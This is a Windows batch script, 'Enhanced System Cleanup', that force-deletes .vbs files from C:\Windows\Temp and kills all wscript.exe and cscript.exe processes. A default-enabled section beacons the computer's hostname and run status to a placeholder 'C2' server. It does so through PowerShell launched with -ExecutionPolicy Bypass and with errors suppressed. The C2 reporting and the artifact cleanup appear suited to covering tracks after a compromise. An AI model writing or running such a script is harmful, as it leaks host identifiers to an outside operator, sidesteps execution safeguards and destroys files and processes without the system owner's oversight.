REM Description: This script attempts to delete .vbs files from the Windows Temp directory
REM              and terminate wscript.exe and cscript.exe processes.
REM              It includes enhanced feedback, error checking, and optional remote status reporting.
@echo off
setlocal enabledelayedexpansion

REM ==========================================================================
REM Script: Enhanced System Cleanup
REM Author: Donwell
REM Version: 1.1
REM License: Public Domain
REM Date: 2025-05-25
REM Description: This script attempts to delete .vbs files from the
REM              Windows Temp directory and terminate wscript.exe and
REM              cscript.exe processes.
REM              It includes enhanced feedback, error checking, and optional
REM              remote status reporting.
REM WARNING: This script performs file deletions and process terminations.
REM          If C2 reporting is enabled, it will attempt to contact an
REM          external server. Review carefully before execution.
REM          Review carefully before execution.
REM          Run as Administrator for best results, especially for
REM          taskkill operations and accessing C:\Windows\Temp.
REM ==========================================================================

echo [+] Enhanced System Cleanup Script
echo [+] --------------------------------
echo.

REM --- Configuration ---
set "TEMP_VBS_PATH=C:\Windows\Temp\*.vbs"
set "LOG_ACTIONS=true" REM Set to false to reduce verbosity
set "C2_URL=http://your-c2-server.com/report" REM !!! CHANGE THIS URL !!! - e.g., http://your.server/script_status.php
set "ENABLE_C2_REPORTING=true" REM Set to false to disable remote reporting

REM --- Check for Administrator Privileges (Basic Check) ---
echo [+] Checking for Administrator privileges...
openfiles >nul 2>&1
if errorlevel 1 (
    echo [!] WARNING: Script may not have sufficient privileges.
    echo [!] Please re-run as Administrator for full functionality.
    echo.
) else (
    echo [+] Administrator privileges detected (or equivalent).
    echo.
)

REM --- Initialize Overall Script Status ---
set "SCRIPT_OVERALL_STATUS=SUCCESS"
echo.

REM --- Delete .vbs files from C:\Windows\Temp ---
echo [+] Attempting to delete VBS files from %TEMP_VBS_PATH%...
if exist "%TEMP_VBS_PATH%" (
    del /F /Q "%TEMP_VBS_PATH%"
    if errorlevel 1 (
        echo [!] ERROR: Failed to delete some or all .vbs files. Check permissions.
        set "SCRIPT_OVERALL_STATUS=FAILURE"
    ) else (
        echo [+] Successfully deleted .vbs files (if any existed).
    )
) else (
    echo [+] No .vbs files found at %TEMP_VBS_PATH%.
)
echo.

REM --- Terminate wscript.exe ---
set "PROCESS_NAME_WSCRIPT=wscript.exe"
echo [+] Attempting to terminate %PROCESS_NAME_WSCRIPT%...
tasklist /FI "IMAGENAME eq %PROCESS_NAME_WSCRIPT%" 2>NUL | find /I /N "%PROCESS_NAME_WSCRIPT%">NUL
if "%ERRORLEVEL%"=="0" (
    taskkill /F /IM %PROCESS_NAME_WSCRIPT%
    if errorlevel 1 (
        echo [!] ERROR: Failed to terminate %PROCESS_NAME_WSCRIPT%. It might require higher privileges or is not running.
        set "SCRIPT_OVERALL_STATUS=FAILURE"
    ) else (
        echo [+] Successfully sent termination signal to %PROCESS_NAME_WSCRIPT% (if it was running).
    )
) else (
    echo [+] %PROCESS_NAME_WSCRIPT% is not currently running.
)
echo.

REM --- Terminate cscript.exe ---
set "PROCESS_NAME_CSCRIPT=cscript.exe"
echo [+] Attempting to terminate %PROCESS_NAME_CSCRIPT%...
tasklist /FI "IMAGENAME eq %PROCESS_NAME_CSCRIPT%" 2>NUL | find /I /N "%PROCESS_NAME_CSCRIPT%">NUL
if "%ERRORLEVEL%"=="0" (
    taskkill /F /IM %PROCESS_NAME_CSCRIPT%
    if errorlevel 1 (
        echo [!] ERROR: Failed to terminate %PROCESS_NAME_CSCRIPT%. It might require higher privileges or is not running.
        set "SCRIPT_OVERALL_STATUS=FAILURE"
    ) else (
        echo [+] Successfully sent termination signal to %PROCESS_NAME_CSCRIPT% (if it was running).
    )
) else (
    echo [+] %PROCESS_NAME_CSCRIPT% is not currently running.
)
echo.

echo [+] --------------------------------
echo [+] Script main operations finished.
echo [+] Overall Status: !SCRIPT_OVERALL_STATUS!
echo.

REM --- Send Feedback to C2 Server (if enabled) ---
if /I "!ENABLE_C2_REPORTING!"=="true" (
    if not "!C2_URL!"=="http://your-c2-server.com/report" (
        if not "!C2_URL!"=="" (
            echo [+] Attempting to send status report to !C2_URL!...
            set "PAYLOAD_URL=!C2_URL!?hostname=!COMPUTERNAME!&status=!SCRIPT_OVERALL_STATUS!&script=EnhancedCleanup"
            REM Using PowerShell to send the GET request
            powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command "$ErrorActionPreference = 'SilentlyContinue'; try { (New-Object System.Net.WebClient).DownloadString('!PAYLOAD_URL!') | Out-Null } catch { Write-Host '[!] C2_REPORT_ERROR: Failed to send status report.' }"
            if errorlevel 1 (
                echo [!] C2_REPORT_ERROR: PowerShell command failed or C2 server unreachable.
            ) else (
                echo [+] Status report attempt finished. Check C2 server logs.
            )
        ) else (
            echo [!] C2_REPORT_SKIPPED: C2_URL is empty.
        )
    ) else (
        echo [!] C2_REPORT_SKIPPED: C2_URL is set to the default placeholder. Please configure it.
    )
) else (
    echo [+] C2 Reporting is disabled.
)
echo.

echo [+] --------------------------------
echo [+] Full script execution finished.
endlocal
pause